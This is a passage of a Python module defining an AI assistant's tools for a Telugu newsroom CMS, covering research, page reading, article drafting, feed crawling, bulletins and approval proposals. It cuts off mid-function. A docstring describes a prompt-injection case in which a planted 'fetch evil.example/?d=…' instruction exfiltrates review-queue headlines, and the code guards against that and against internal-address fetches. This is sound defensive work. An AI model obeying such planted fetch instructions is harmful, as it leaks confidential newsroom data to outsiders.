"""Tools that do work: research, drafts, crawl, bulletins, proposals. See registry.py.

Each tool is the CMS button a staff member could press by hand, behind the same
permission and scope check as that button's route, and nothing here reaches a
reader: articles land at SUBMITTED under the requester's name (so somebody else
approves them), bulletins are held at READY, and approve / publish / push are
`propose_action` cards a human presses. Anything slower than a few seconds is a
job (see jobs.py) and returns a job card at once.

Two pieces here are shared with jobs.py because a person-triggered job must
behave exactly like the tool:

  * `paid()` — every billable model call: quota and budget first, a ledger row
    after, committed on the spot, success or failure, so no later rollback
    un-bills a call the vendor has already charged for.
  * `safe_extract()` — read a web page a person (or a search result) named,
    without letting that URL reach inside our own network.
"""

from __future__ import annotations

import ipaddress
import re
import socket
from collections.abc import Callable
from datetime import date, datetime, time, timedelta
from typing import Any
from urllib.parse import urlsplit

import httpx
from sqlalchemy import func, or_, select
from sqlalchemy.orm import Session

from app.core.errors import (
    AiSensitiveTopicError,
    ConflictError,
    NotFoundError,
    ValidationError,
)
from app.core.permissions import LEVEL_SELF_APPROVE
from app.db.base import utcnow
from app.integrations.ai import catalogue, get_ai
from app.integrations.ai.sensitive import is_sensitive as sensitive_topic
from app.integrations.feeds import fetcher
from app.integrations.feeds.extract import extract_from_html
from app.integrations.tts import get_tts
from app.models.assistant import AssistantJob, AssistantMessage
from app.models.bulletin import AudioBulletin
from app.models.content import Article, Category, Tag
from app.models.enums import (
    ArticleStatus,
    AuditAction,
    BulletinStatus,
    IngestStatus,
    RewriteStatus,
    SourceBeat,
    WorkflowState,
)
from app.models.geo import District
from app.models.ingestion import ContentSource, IngestedItem
from app.models.media import Media
from app.services import (
    ai_service,
    ai_usage_service,
    audit_service,
    bulletin_service,
    crawl_service,
    notification_service,
    settings_service,
    social_card_service,
    workflow_service,
)
from app.services.assistant import tools_data
from app.services.assistant.registry import ToolContext, start_job, sweep_stale_job, tool
from app.telugu.normalize import normalize_text

IST = bulletin_service.IST
_WORDS = re.compile(r"[^\wఀ-౿]+", re.UNICODE)
RECENCY = ("hour", "day", "week", "month", "year")
#: What one fetched page contributes, to the model and to the source material.
MAX_PAGE_CHARS = 6_000

_RECENCY_ARG = {
    "type": "string",
    "enum": list(RECENCY),
    "description": "Only pages published in the last hour/day/week/month/year. Default week.",
}
_CATEGORY_ARG = {"type": "string", "description": "Category id, slug, or English/Telugu name."}
_DISTRICT_ARG = {"type": "string", "description": "District id, slug, or English/Telugu name."}


# --------------------------------------------------------------------------- #
# Shared with jobs.py
# --------------------------------------------------------------------------- #
def llm(db: Session, *, bulk: bool = False):
    """The configured text provider: editorial model, or the bulk one."""
    return get_ai(**settings_service.ai_credentials(db, bulk=bulk))


def research_on(db: Session) -> bool:
    return settings_service.ai_enabled(db) and settings_service.get_bool(
        db, "ai.research_enabled"
    )


def _bill(
    db: Session,
    provider: Any,
    user_id: int,
    operation: str,
    model: str | None,
    *,
    ok: bool = True,
    error: str | None = None,
) -> None:
    ai_usage_service.record(
        db,
        operation=operation,
        provider=provider.key,
        model=model or getattr(provider, "model_name", None),
        actor_id=user_id,
        usage=getattr(provider, "last_usage", None),
        ok=ok,
        error=error,
    )
    db.commit()


def paid(
    db: Session,
    provider: Any,
    user_id: int,
    operation: str,
    call: Callable[[], Any],
    *,
    model: str | None = None,
) -> Any:
    """One billable call. `call` includes the parse: a reply that comes back
    cut off mid-JSON was still charged, so it is billed as a failure.

    The kill switch is read here, on every call, not once when a job starts:
    an admin who turns AI off to stop the spend stops a ten-article job at
    its next call."""
    _require_ai(db)
    ai_usage_service.guard(db, user_id)
    provider.last_usage = {}  # a reused provider must not bill the last call twice
    try:
        out = call()
    except Exception as exc:
        _bill(
            db, provider, user_id, operation, model, ok=False,
            error=str(getattr(exc, "details", None) or exc)[:300],
        )
        raise
    _bill(db, provider, user_id, operation, model)
    return out


def research(db: Session, provider: Any, user_id: int, query: str, **kwargs: Any) -> dict:
    return paid(
        db, provider, user_id, "research",
        lambda: provider.research(query, **kwargs),
        model=catalogue.DEFAULT_RESEARCH_MODEL,
    )


def _public_url(url: str) -> bool:
    """http(s), no credentials in it, a URL httpx can parse, and a host that
    resolves only to globally routable addresses. Fails closed.

    Not `ingestion_service._is_internal`: it lets 100.64.0.0/10 through
    (shared/CGNAT space — a cloud metadata service and overlay-network peers
    live there), and an IDNA name it cannot encode raises out of it.
    `is_global` covers that range and the other special ones too.
    """
    try:
        parts = urlsplit(url)
        httpx.URL(url)
        if parts.scheme not in ("http", "https") or not parts.hostname:
            return False
        if parts.username is not None or parts.password is not None:
            return False
        infos = socket.getaddrinfo(parts.hostname, None)
        return bool(infos) and all(
            ipaddress.ip_address(str(info[4][0]).split("%")[0]).is_global for info in infos
        )
    except (ValueError, OSError, httpx.InvalidURL):
        return False


def safe_extract(url: str, *, max_chars: int = MAX_PAGE_CHARS) -> dict[str, Any]:
    """Read one page's article text. Never raises.

    The guard runs before any connection, and again on every redirect hop and
    on the robots.txt fetch (see `fetcher.fetch_page(url_guard=)`), so a public
    page answering 302 to 169.254.169.254 is stopped at the hop. robots.txt
    and the per-host throttle apply exactly as for the crawl.

    ponytail: the guard resolves the name, then httpx resolves it again to
    connect — a DNS-rebinding window of milliseconds. Pinning the resolved IP
    in a custom transport closes it, if this ever fetches for untrusted users.
    """
    page = fetcher.fetch_page(url, url_guard=_public_url)
    if page.status != "ok" or not page.html:
        return {"status": page.status, "url": url}
    text = extract_from_html(page.html, max_chars=max_chars)
    return {
        "status": text.status,
        "title": text.title,
        "url": page.final_url or url,
        "published_at": text.published_at.isoformat() if text.published_at else None,
        "word_count": text.word_count,
        "text": text.text,
    }


# --------------------------------------------------------------------------- #
# Small argument and state helpers
# --------------------------------------------------------------------------- #
def _str(args: dict[str, Any], key: str, *, limit: int, required: bool = False) -> str:
    value = args.get(key)
    text = value.strip()[:limit] if isinstance(value, str) else ""
    if required and not text:
        raise ValidationError(f"`{key}` is required.", f"`{key}` తప్పనిసరి.", {key: "required"})
    return text


def _int(args: dict[str, Any], key: str, default: int, lo: int, hi: int) -> int:
    try:
        value = int(args.get(key, default))
    except (TypeError, ValueError):
        value = default
    return max(lo, min(hi, value))


def _choice(args: dict[str, Any], key: str, choices: tuple[str, ...], default: str | None):
    value = args.get(key)
    if value in (None, ""):
        return default
    if value not in choices:
        raise ValidationError(
            f"`{key}` must be one of {', '.join(choices)}.",
            f"`{key}` వీటిలో ఒకటి కావాలి: {', '.join(choices)}.",
            {key: list(choices)},
        )
    return value


def _resolve(db: Session, model: Any, finder: Callable, value: Any, what: str) -> int | None:
    """An id for a category/district the model named, or a refusal that lists
    what exists — an unknown name is an error, never a silently unfiltered run."""
    if value in (None, ""):
        return None
    row = finder(db, value)
    if row is None:
        known = db.scalars(
            select(model.slug).where(model.is_active.is_(True)).order_by(model.slug).limit(60)
        ).all()
        raise ValidationError(
            f"No {what} matches {value!r}. Known: {', '.join(known)}.",
            f"{value!r} అనే {what} లేదు. ఉన్నవి: {', '.join(known)}.",
            {what: str(value)},
        )
    return row.id


def _category(db: Session, value: Any) -> int | None:
    return _resolve(db, Category, tools_data.resolve_category, value, "category")


def _district(db: Session, value: Any) -> int | None:
    return _resolve(db, District, tools_data.resolve_district, value, "district")


def _source_id(db: Session, value: Any) -> int | None:
    if value in (None, ""):
        return None
    text = str(value).strip()
    row = db.scalar(
        select(ContentSource).where(
            or_(
                ContentSource.slug == text,
                func.lower(ContentSource.name) == text.lower(),
                ContentSource.name_te == text,
            )
        )
    )
    if row is None:
        known = db.scalars(
            select(ContentSource.slug)
            .where(ContentSource.is_active.is_(True))
            .order_by(ContentSource.slug)
            .limit(40)
        ).all()
        raise ValidationError(
            f"No feed source matches {text!r}. Active sources: {', '.join(known)}.",
            f"{text!r} అనే ఫీడ్ లేదు. ఉన్నవి: {', '.join(known)}.",
            {"source": text},
        )
    return row.id


def _require_ai(db: Session) -> None:
    if not settings_service.ai_enabled(db):
        raise ValidationError(
            "AI is switched off. Turn it on in Settings → AI.",
            "AI ఆఫ్‌లో ఉంది. సెట్టింగ్స్ → AI లో ఆన్ చేయండి.",
            {"ai.enabled": "is off"},
        )


def research_provider(db: Session) -> Any:
    if not research_on(db):
        raise ValidationError(
            "Web research is switched off. Turn it on in Settings → AI → Web research.",
            "వెబ్ పరిశోధన ఆఫ్‌లో ఉంది. సెట్టింగ్స్ → AI → వెబ్ పరిశోధనలో ఆన్ చేయండి.",
            {"ai.research_enabled": "is off"},
        )
    provider = llm(db)
    if provider.key != "aimlapi":
        raise ValidationError(
            "Web research needs the aimlapi provider with its key (Settings → AI).",
            "వెబ్ పరిశోధనకు aimlapi ప్రొవైడర్, దాని కీ కావాలి (సెట్టింగ్స్ → AI).",
            {"ai.provider": provider.key},
        )
    return provider


def _screen_topic(db: Session, text: str) -> None:
    """The word-start screen, the crawl's term lists as whole words, and the
    admin's extra terms. Any hit hands the story to a person.

    Not `crawl_service.is_sensitive` itself: its Telugu stems take any ending —
    `మత` fires on మత్స్యకారులు, `బీసీ` on బీసీసీఐ — which is right for a
    thirty-second editor check of a feed item, not for a finished, paid-for
    article. On a live run (2026-09-29), when that gate still matched bare
    substrings (`కుల` inside అనుకూల), it threw away a Smart TV deals article. The
    word-start screen alone misses `కులం పేరుతో` (it names no topic for the bare
    noun), so the crawl's own words still count, as words."""
    topic = sensitive_topic(text)
    lowered = normalize_text(text or "").casefold()
    words = {w for w in _WORDS.split(lowered) if w}
    phrases = {p for p in crawl_service.SENSITIVE_EN if " " in p}
    extra = settings_service.get(db, "crawl.sensitive_extra_terms") or ()
    if (
        topic
        or words & (crawl_service.SENSITIVE_TE | (crawl_service.SENSITIVE_EN - phrases))
        or any(p in lowered for p in phrases)
        or any(t and normalize_text(t).casefold() in lowered for t in extra)
    ):
        raise AiSensitiveTopicError(details={"topic": topic or "sensitive"})


def _article(db: Session, article_id: Any) -> Article:
    try:
        article = db.get(Article, int(article_id))
    except (TypeError, ValueError):
        article = None
    if article is None or article.deleted_at is not None:
        raise NotFoundError()
    return article


def _has_hero(db: Session, article: Article) -> bool:
    hero = db.get(Media, article.hero_media_id) if article.hero_media_id else None
    return hero is not None and hero.deleted_at is None and hero.mime.startswith("image/")


def _t(te: str, en: str) -> dict[str, str]:
    return {"te": te, "en": en}


# --------------------------------------------------------------------------- #
# Research
# --------------------------------------------------------------------------- #
@tool(
    "web_research",
    "Search the live web and get a short answer with its sources. Use it for anything "
    "outside our own database: current events, deals and prices, a fact to check. The "
    "answer is the search engine's own summary - treat it as leads, not proof, and always "
    "name where a figure came from. To write articles use write_articles, which "
    "researches by itself.",
    {
        "type": "object",
        "properties": {
            "query": {
                "type": "string",
                "description": "What to find, in English or Telugu. Be specific: names, place, dates.",
            },
            "recency": _RECENCY_ARG,
            "domains": {
                "type": "array",
                "items": {"type": "string"},
                "maxItems": 10,
                "description": "Optional: search only these sites, e.g. [\"flipkart.com\"].",
            },
        },
        "required": ["query"],
    },
    permissions=("ai.use",),
    enabled=research_on,
    label=("వెబ్ పరిశోధన", "Web research"),
)
def web_research(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    query = _str(args, "query", limit=500, required=True)
    recency = _choice(args, "recency", RECENCY, "week")
    domains = [d.strip() for d in args.get("domains") or [] if isinstance(d, str) and d.strip()]
    provider = research_provider(ctx.db)
    out = research(ctx.db, provider, ctx.user_id, query, recency=recency, domains=domains[:10])
    sources = out["sources"][:10]
    return {
        "answer": out["answer"][:3000],
        "sources": [{"title": s["title"], "url": s["url"], "date": s["date"]} for s in sources],
        "cards": [
            {
                "type": "sources",
                "title": _t("వెబ్ మూలాలు", "Web sources"),
                "items": [
                    {
                        "title": s["title"] or s["url"],
                        "url": s["url"],
                        "date": s["date"],
                        "snippet": (s.get("snippet") or "")[:300],
                    }
                    for s in sources
                ],
            }
        ],
    }


def _url_seen(ctx: ToolContext, url: str) -> bool:
    """Did the user type this URL in this conversation, or a web_research
    result list it? A GET is a way out: a planted "fetch evil.example/?d=<the
    review queue's headlines>" would carry newsroom data off in the query
    string. A URL holding data the model assembled cannot have appeared
    before, so this closes that channel and leaves every honest use open."""
    if ctx.conversation_id is None:
        return False
    rows = ctx.db.scalars(
        select(AssistantMessage)
        .where(
            AssistantMessage.conversation_id == ctx.conversation_id,
            AssistantMessage.role.in_(("user", "tool")),
        )
        .order_by(AssistantMessage.id.desc())
        .limit(200)
    ).all()
    for row in rows:
        if row.role == "user" and url in (row.content or ""):
            return True
        payload = row.payload or {}
        if row.role == "tool" and payload.get("name") == "web_research":
            cards = payload.get("cards") or []
            if any(i.get("url") == url for c in cards for i in c.get("items") or []):
                return True
    return False


@tool(
    "read_web_page",
    "Fetch one public web page and return its article text (title, date, up to 6000 "
    "characters). Only a link the user typed in this chat, or a source a web_research "
    "result listed, exactly as given. Internal and private addresses are refused; "
    "robots.txt is honoured.",
    {
        "type": "object",
        "properties": {"url": {"type": "string", "description": "An http(s) URL."}},
        "required": ["url"],
    },
    permissions=("ai.use",),
    label=("వెబ్ పేజీ చదవడం", "Read a web page"),
)
def read_web_page(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    url = _str(args, "url", limit=2000, required=True)
    if not _url_seen(ctx, url):
        raise ValidationError(
            "I can only open a link you gave me in this chat, or one a web search returned.",
            "ఈ చాట్‌లో మీరు ఇచ్చిన లింక్‌నో, వెబ్ పరిశోధనలో వచ్చిన లింక్‌నో మాత్రమే తెరవగలను.",
            {"url": "not given by the user or a web_research result"},
        )
    page = safe_extract(url)
    if page["status"] != "ok":
        raise ValidationError(
            f"Could not read that page ({page['status']}).",
            f"ఆ పేజీని చదవలేకపోయాం ({page['status']}).",
            {"status": page["status"]},
        )
    return page


# --------------------------------------------------------------------------- #
# Writing
# --------------------------------------------------------------------------- #
@tool(
    "write_articles",
    "Research the web, read the source pages on our server, and write 1-10 Telugu "
    "articles into the review queue - e.g. '5 articles on Big Billion Days deals, 5 "
    "products each' is count=5, items_per_article=5. Runs as a background job and returns "
    "a job id at once. Articles are written only from facts on the fetched pages, in our "
    "own words, with no outlet named; every price is checked against the source material "
    "and an item whose price is not found there is left out. They land at SUBMITTED under the "
    "user's name, so a different editor must approve them, and each needs a hero photo "
    "before it can be published. Nothing is published.",
    {
        "type": "object",
        "properties": {
            "brief": {
                "type": "string",
                "description": "The subject, e.g. 'Flipkart Big Billion Days 2026 deals'.",
            },
            "count": {"type": "integer", "minimum": 1, "maximum": 10, "description": "How many articles. Default 1."},
            "items_per_article": {
                "type": "integer",
                "minimum": 0,
                "maximum": 10,
                "description": "Products/items per article (name, price, MRP, offer). 0 = an ordinary news article. Default 0.",
            },
            "angles": {
                "type": "array",
                "items": {"type": "string"},
                "maxItems": 10,
                "description": "One focus per article, e.g. ['laptops', 'phones under ₹20,000']. Missing ones are proposed automatically.",
            },
            "category": _CATEGORY_ARG,
            "district": _DISTRICT_ARG,
            "research": {
                "type": "boolean",
                "description": "Search the web first (default true). false = write only from `notes`.",
            },
            "recency": _RECENCY_ARG,
            "notes": {"type": "string", "description": "Facts or instructions from the editor (max 2000 characters)."},
        },
        "required": ["brief"],
    },
    permissions=("ai.use", "article.create"),
    enabled=settings_service.ai_enabled,
    label=("కథనాలు రాయడం", "Write articles"),
)
def write_articles(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    db, principal = ctx.db, ctx.principal
    brief = _str(args, "brief", limit=1000, required=True)
    count = _int(args, "count", 1, 1, 10)
    items = _int(args, "items_per_article", 0, 0, 10)
    angles = [a.strip()[:200] for a in args.get("angles") or [] if isinstance(a, str) and a.strip()]
    notes = _str(args, "notes", limit=2000)
    use_research = args.get("research", True) is not False
    recency = _choice(args, "recency", RECENCY, "week")

    _require_ai(db)
    if use_research:
        research_provider(db)
    elif not notes:
        raise ValidationError(
            "Without web research I can only write from facts you give me: put them in `notes`.",
            "వెబ్ పరిశోధన లేకుండా రాయాలంటే వాస్తవాలు `notes`లో ఇవ్వండి.",
            {"notes": "required when research is false"},
        )
    if llm(db).key == "heuristic":
        raise ValidationError(
            "No AI provider key is configured (Settings → AI).",
            "AI ప్రొవైడర్ కీ లేదు (సెట్టింగ్స్ → AI).",
            {"ai.api_key": "missing"},
        )
    category_id = _category(db, args.get("category"))
    district_id = _district(db, args.get("district"))
    # convert_draft's rule, said up front rather than after the money is spent:
    # a district-scoped staff member can only file copy for their districts,
    # and copy with no district is only for someone with a state-wide scope.
    if district_id is None and not principal.is_global:
        raise ValidationError(
            "You work on specific districts, so each article needs a `district`.",
            "మీరు కొన్ని జిల్లాలకే పరిమితం, కాబట్టి `district` చెప్పండి.",
            {"district": "required for your scope"},
        )
    principal.assert_scope(district_id=district_id, mandal_id=None)
    _screen_topic(db, " ".join([brief, notes, *angles]))

    out = start_job(
        ctx,
        "research_articles",
        {
            "brief": brief,
            "count": count,
            "items_per_article": items,
            "angles": angles[:count],
            "category_id": category_id,
            "district_id": district_id,
            "research": use_research,
            "recency": recency,
            "notes": notes,
        },
        f"{count} × {brief[:150]}",
    )
    out["note"] = (
        "Running in the background (a few minutes per article). The articles will land "
        "in the review queue; the user sees progress on the job card."
    )
    return out


# --------------------------------------------------------------------------- #
# Crawl
# --------------------------------------------------------------------------- #
_BEATS = tuple(b.value for b in SourceBeat)


@tool(
    "crawl_feeds_now",
    "Poll our configured RSS/Atom news feeds right now, even if they are not due, so "
    "fresh items land in the ingestion queue. Optionally one beat or one source. Runs as "
    "a background job. It only fetches; to turn items into articles use rewrite_crawled_news.",
    {
        "type": "object",
        "properties": {
            "beat": {"type": "string", "enum": list(_BEATS), "description": "Only sources on this beat."},
            "source": {"type": "string", "description": "Only this source: slug or name."},
        },
    },
    permissions=("taxonomy.manage",),
    label=("ఫీడ్‌లు ఇప్పుడే క్రాల్", "Crawl feeds now"),
)
def crawl_feeds_now(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    beat = _choice(args, "beat", _BEATS, None)
    source_id = _source_id(ctx.db, args.get("source"))
    stmt = select(func.count(ContentSource.id)).where(ContentSource.is_active.is_(True))
    if beat:
        stmt = stmt.where(ContentSource.beat == SourceBeat(beat))
    if source_id:
        stmt = stmt.where(ContentSource.id == source_id)
    if not ctx.db.scalar(stmt):
        raise ValidationError(
            "No active feed source matches.", "సరిపోయే క్రియాశీల ఫీడ్ లేదు.", {"beat": beat}
        )
    return start_job(
        ctx, "crawl_fetch", {"beat": beat, "source_id": source_id}, f"Crawl feeds ({beat or 'all'})"
    )


@tool(
    "rewrite_crawled_news",
    "Rewrite recently crawled news items into our own Telugu copy and put them in the "
    "review queue (SUBMITTED, under the user's name). Picks NEW items from the last "
    "`hours` (default 1), newest first, optionally matching `query` in the headline or "
    "summary. Items already rewritten are imported as they are. Sensitive subjects are "
    "routed to a person, not rewritten. Background job.",
    {
        "type": "object",
        "properties": {
            "query": {"type": "string", "description": "Words to match in the item headline/summary (mostly Telugu)."},
            "hours": {"type": "integer", "minimum": 1, "maximum": 48, "description": "Look back this many hours. Default 1."},
            "limit": {"type": "integer", "minimum": 1, "maximum": 20, "description": "At most this many items. Default 10."},
            "beat": {"type": "string", "enum": list(_BEATS)},
            "source": {"type": "string", "description": "Source slug or name."},
            "district": _DISTRICT_ARG,
        },
    },
    permissions=("ai.use", "article.create"),
    label=("క్రాల్ వార్తల పునర్లేఖనం", "Rewrite crawled news"),
)
def rewrite_crawled_news(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    db = ctx.db
    # The single-item rewrite route's gate (crawl + AI + rewrite switches).
    if not crawl_service.rewrite_enabled(db):
        raise ValidationError(
            "AI rewriting is switched off.",
            "AI పునర్లేఖనం ఆఫ్‌లో ఉంది.",
            {"crawl.rewrite_enabled": "is off"},
        )
    query = _str(args, "query", limit=200)
    hours = _int(args, "hours", 1, 1, 48)
    limit = _int(args, "limit", 10, 1, 20)
    beat = _choice(args, "beat", _BEATS, None)
    source_id = _source_id(db, args.get("source"))
    district_id = _district(db, args.get("district"))

    when = func.coalesce(IngestedItem.published_at, IngestedItem.fetched_at)
    stmt = select(IngestedItem.id).where(
        IngestedItem.status == IngestStatus.NEW,
        IngestedItem.article_id.is_(None),
        IngestedItem.rewrite_status.in_((RewriteStatus.NONE, RewriteStatus.READY)),
        when >= utcnow() - timedelta(hours=hours),
    )
    if query:
        needle = query.lower()
        stmt = stmt.where(
            or_(
                func.lower(IngestedItem.title).contains(needle, autoescape=True),
                func.lower(IngestedItem.summary).contains(needle, autoescape=True),
            )
        )
    if source_id:
        stmt = stmt.where(IngestedItem.source_id == source_id)
    if beat:
        stmt = stmt.join(ContentSource, IngestedItem.source_id == ContentSource.id).where(
            ContentSource.beat == SourceBeat(beat)
        )
    if district_id:
        stmt = stmt.where(IngestedItem.matched_district_id == district_id)
    ids = list(db.scalars(stmt.order_by(when.desc(), IngestedItem.id.desc()).limit(limit)).all())
    if not ids:
        return {
            "matched": 0,
            "note": f"No new crawled items in the last {hours} h match. Try more hours, "
            "another query (headlines are mostly Telugu), or crawl_feeds_now first.",
        }
    out = start_job(
        ctx,
        "rewrite_items",
        {"item_ids": ids, "district_id": district_id},
        f"Rewrite {len(ids)} crawled items",
    )
    out["matched"] = len(ids)
    return out


# --------------------------------------------------------------------------- #
# Audio bulletin
# --------------------------------------------------------------------------- #
def _next_slot(now: datetime | None = None) -> tuple[str, int]:
    """The next slot more than ten minutes ahead (IST). Nearer than that the
    beat is about to produce it, and two writers on one row race."""
    moment = (now or utcnow()).astimezone(IST) + timedelta(minutes=10)
    for slot in bulletin_service.SLOTS:
        if datetime.combine(moment.date(), time(hour=slot), tzinfo=IST) > moment:
            return moment.date().isoformat(), slot
    return (moment.date() + timedelta(days=1)).isoformat(), bulletin_service.SLOTS[0]


@tool(
    "prepare_audio_bulletin",
    "Prepare a spoken Telugu news bulletin of 1-5 minutes from stories already published, "
    "record it with the configured voice, and hold it at READY for a desk editor to "
    "publish (never published here). Defaults to the next bulletin slot today; pick "
    "stories by category/district/recency or give article_ids. Background job.",
    {
        "type": "object",
        "properties": {
            "minutes": {"type": "integer", "minimum": 1, "maximum": 5, "description": "Length. Default 3."},
            # No `enum`: Gemini's function schema takes string enums only, and
            # one bad spec fails every chat call. The handler checks the value.
            "slot": {
                "type": "integer",
                "description": f"IST hour of today's bulletin to fill, one of {list(bulletin_service.SLOTS)}. "
                "Default: the next one still ahead.",
            },
            "category": _CATEGORY_ARG,
            "district": _DISTRICT_ARG,
            "article_ids": {
                "type": "array",
                "items": {"type": "integer"},
                "maxItems": 12,
                "description": "Read exactly these published stories, in this order.",
            },
            "hours_back": {
                "type": "integer",
                "minimum": 1,
                "maximum": 48,
                "description": "Pick stories published in the last N hours. Default 12.",
            },
        },
    },
    permissions=("voice.manage",),
    label=("ఆడియో బులెటిన్", "Audio bulletin"),
)
def prepare_audio_bulletin(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    db = ctx.db
    if not settings_service.bulletin_enabled(db):
        raise ValidationError(
            message_en="Turn the audio bulletin on in Settings first.",
            message_te="ముందుగా సెట్టింగ్స్‌లో ఆడియో బులెటిన్‌ను ఆన్ చేయండి.",
            details={"bulletin.enabled": "is off"},
        )
    if not get_tts(**settings_service.tts_credentials(db)).available():
        raise ValidationError(
            "No voice can record it: set voice.provider and its API key in Settings → Voice.",
            "రికార్డ్ చేసే వాయిస్ లేదు: సెట్టింగ్స్ → వాయిస్‌లో voice.provider, API కీ ఇవ్వండి.",
            {"voice.provider": settings_service.tts_credentials(db)["provider"]},
        )
    minutes = _int(args, "minutes", 3, 1, 5)
    if args.get("slot") not in (None, ""):
        try:
            slot = int(args["slot"])
        except (TypeError, ValueError):
            slot = -1
        if slot not in bulletin_service.SLOTS:
            raise ValidationError(details={"slot": f"must be one of {list(bulletin_service.SLOTS)}"})
        day = bulletin_service.today().isoformat()
    else:
        day, slot = _next_slot()
    existing = db.scalar(
        select(AudioBulletin).where(
            AudioBulletin.bulletin_date == date.fromisoformat(day),
            AudioBulletin.slot == slot,
        )
    )
    label = bulletin_service.slot_label_te(slot)
    if existing is not None and existing.status == BulletinStatus.PUBLISHED:
        raise ConflictError(
            f"The {slot}:00 bulletin ({day}) is already live. Pick another slot.",
            f"{label} ({day}) ఇప్పటికే ప్రసారంలో ఉంది. మరో స్లాట్ ఎంచుకోండి.",
            {"slot": slot, "date": day},
        )
    article_ids: list[int] = []
    for value in (args.get("article_ids") or [])[:12]:
        try:
            article_ids.append(int(value))
        except (TypeError, ValueError):
            continue
    article_ids = list(dict.fromkeys(article_ids))  # one story, one item row (unique key)
    if article_ids and not db.scalar(
        select(func.count(Article.id)).where(
            Article.id.in_(article_ids),
            Article.status == ArticleStatus.PUBLISHED,
            Article.deleted_at.is_(None),
        )
    ):
        raise ValidationError(
            "None of those stories is published; a bulletin reads published stories only.",
            "ఆ కథనాలేవీ ప్రచురించబడలేదు; బులెటిన్ ప్రచురించినవే చదువుతుంది.",
            {"article_ids": article_ids},
        )
    return start_job(
        ctx,
        "bulletin",
        {
            "date": day,
            "slot": slot,
            "minutes": minutes,
            "category_id": _category(db, args.get("category")),
            "district_id": _district(db, args.get("district")),
            "article_ids": article_ids,
            "hours_back": _int(args, "hours_back", 12, 1, 48),
        },
        f"{minutes}-min bulletin, {day} {slot}:00",
    )


# --------------------------------------------------------------------------- #
# Ideas and cards
# --------------------------------------------------------------------------- #
@tool(
    "suggest_story_ideas",
    "Propose story ideas for today from gaps in our own recent coverage (it does not "
    "search the web). Saves them to the AI suggestions list.",
    {
        "type": "object",
        "properties": {"limit": {"type": "integer", "minimum": 1, "maximum": 10, "description": "Default 5."}},
    },
    permissions=("ai.use",),
    label=("కథన సూచనలు", "Story ideas"),
)
def suggest_story_ideas(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    # generate_suggestions checks only the newsroom budget (the beat runs it
    # unattended); a person asking also spends their own daily allowance.
    ai_usage_service.guard(ctx.db, ctx.user_id)
    created = ai_service.generate_suggestions(
        ctx.db, limit=_int(args, "limit", 5, 1, 10), actor_id=ctx.user_id
    )
    audit_service.record(
        ctx.db,
        action=AuditAction.AI_RUN,
        entity_type="ai_suggestion",
        entity_id="generate",
        actor=ctx.principal.user,
        after={"count": len(created), "via": "assistant"},
    )
    ideas = [
        {"id": s.id, "topic_te": s.topic_te, "topic_en": s.topic_en, "score": round(s.score, 2)}
        for s in created
    ]
    return {
        "created": len(ideas),
        "ideas": ideas,
        "cards": [
            {
                "type": "table",
                "title": _t("కథన సూచనలు", "Story ideas"),
                "columns": [
                    {"key": "topic_te", "label": _t("అంశం", "Topic")},
                    {"key": "topic_en", "label": _t("ఆంగ్లంలో", "In English")},
                    {"key": "score", "label": _t("స్కోరు", "Score"), "align": "right"},
                ],
                "rows": [{k: i[k] for k in ("topic_te", "topic_en", "score")} for i in ideas],
            }
        ],
    }


@tool(
    "make_social_card",
    "Render a shareable news card image (photo, headline, summary, masthead) for one of "
    "our articles, using the story's own photo. Returns the image URL.",
    {
        "type": "object",
        "properties": {
            "article_id": {"type": "integer"},
            "aspect": {"type": "string", "enum": ["1:1", "4:5", "16:9", "9:16"], "description": "Default 1:1."},
            "template": {"type": "string", "enum": ["panel", "overlay", "frame"], "description": "Default panel."},
        },
        "required": ["article_id"],
    },
    any_of=("article.edit", "article.edit_own"),
    label=("సోషల్ కార్డ్", "Social card"),
)
def make_social_card(ctx: ToolContext, args: dict[str, Any]) -> dict[str, Any]:
    article = _article(ctx.db, args.get("article_id"))
    ctx.principal.assert_scope(district_id=article.district_id, mandal_id=article.mandal_id)
    out = social_card_service.make_card(
        ctx.db,
        article,
        aspect=_choice(args, "aspect", ("1:1", "4:5", "16:9", "9:16"), "1:1"),
        template=_choice(args, "template", ("panel", "overlay", "frame"), "panel"),
        headline=(article.title_te or "")[:160],
        summary=(article.summary_te or "")[:400],
        tag=None,
        photo="story",
        photo_media_id=None,
        brief=None,
        actor_id=ctx.user_id,
        save=False,
    )
    card = out.get("card")
    if not card:
        return {"available": False, "reason": out.get("reason")}
    return {
        "available": True,
        "url": card["url"],
        "warnings": card.get("warnings") or [],
        "cards": [{"type": "image", "url": card["url"], "alt": article.title_te or ""}],
    }


# --------------------------------------------------------------------------- #
# Proposals and job status
# --------------------------------------------------------------------------- #
_ACTIONS = ("approve_article", "publish_article", "send_push", "publish_bulletin")


def _audience(db: Session, audience: str) -> str:
    """`all | district:<slug> | category:<slug> | tag:<slug>`, checked the way
    the push route will check it, so the button does not fail on press."""
    target, _, slug = audience.partition(":")
    models = {"district": District, "category": Category, "tag": Tag}
    if audience != "all":
        if target not in models or not slug:
            raise ValidationError(
                details={"audience": "all | district:<slug> | category:<slug> | tag:<slug>"}
            )
        notification_service._by_slug(db, models[target], slug, target)
    return audience


def _propose_approve(ctx: ToolContext, article: Article) -> dict[str, Any]:
    ctx.principal.require("article.approve")
    ctx.principal.assert_scope(district_id=article.district_id, mandal_id=article.mandal_id)
    if article.workflow_state not in (WorkflowState.SUBMITTED, WorkflowState.IN_REVIEW):
        raise ConflictError(
            f"Only a submitted story can be approved; this one is {article.workflow_state}.",
            f"సమర్పించిన కథనాన్నే ఆమోదించగలం; ఇది {article.workflow_state} స్థితిలో ఉంది.",
        )
    if article.author_id == ctx.user_id and ctx.principal.level < LEVEL_SELF_APPROVE:
        raise ValidationError(
            "You wrote this story (articles the assistant writes are filed under your "
            "name), and an author cannot approve their own story: another editor must.",
            "ఈ కథనం మీ పేరు మీద ఉంది (సహాయకుడు రాసినవి కూడా). రచయిత స్వయంగా ఆమోదించలేరు; మరో ఎడిటర్ ఆమోదించాలి.",
            {"rule": "two-person"},
        )
    return {
        "type": "action",
        "action": "approve_article",
        "label": _t("ఆమోదించండి", "Approve"),
